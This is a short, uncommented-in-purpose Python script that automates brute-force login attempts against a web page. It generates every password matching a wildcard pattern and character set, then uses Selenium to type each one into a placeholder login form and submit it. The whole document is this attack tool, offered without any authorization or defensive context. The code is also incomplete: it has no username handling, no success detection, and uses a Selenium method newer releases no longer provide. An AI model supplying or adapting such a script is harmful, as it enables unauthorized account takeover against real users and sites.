from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import itertools

def generate_passwords(pattern, charset):
    passwords = []
    for p in itertools.product(*[charset if c == '?' else c for c in pattern]):
        passwords.append(''.join(p))
    return passwords

if __name__ == "__main__":
    pattern = input("Enter the password pattern (use '?' for variable characters): ")
    charset = input("Enter the character set: ")
    generated_passwords = generate_passwords(pattern, charset)
    
    # Initialize a Selenium WebDriver (you need to have the appropriate WebDriver installed)
    driver = webdriver.Chrome()  # Change this based on your preferred WebDriver
    
    login_page_url = "https://example.com/login"  # Replace with the actual login page URL
    
    for password in generated_passwords:
        driver.get(login_page_url)
        
        # Locate the password input field and fill it with the generated password
        password_field = driver.find_element_by_id("password")  # Replace with the actual element locator
        password_field.send_keys(password)
        
        # Submit the form (assuming you also have a submit button)
        submit_button = driver.find_element_by_id("submit")  # Replace with the actual submit button locator
        submit_button.click()
        
        # You might need to add some logic to check if login was successful or not
        
    driver.quit()  # Close the browser after testing
